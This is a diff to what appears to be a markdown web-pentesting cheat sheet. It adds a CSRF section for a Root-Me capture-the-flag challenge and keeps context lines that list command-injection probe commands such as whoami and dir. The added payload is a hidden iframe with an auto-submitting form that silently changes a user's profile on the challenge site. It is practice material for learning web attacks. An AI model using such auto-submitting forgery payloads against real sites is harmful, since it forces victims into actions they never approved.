@@ -78,7 +78,20 @@ Use one of the following commands to test command injection. Or you can use `Bur
 #### Windows
 `whoami` || `dir` || `ping` || `timeout`
 
-### CSRF Token Bypass
+### CSRF 
+#### Simple payload
+Access [this challenge](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection)
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+    <form  id="csrf-form" target="csrf-frame" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="username" value="ad" />
+      <input type="hidden" name="status" value="on" />
+      <input type="submit" value="Submit request" />
+    </form>
+<script>document.getElementById("csrf-form").submit()</script>
+```
+
+#### Token Bypass
 Sample payload for bypassing CSRF Token. Access [this challenge](https://www.root-me.org/en/Challenges/Web-Client/CSRF-token-bypass)
 
 ```
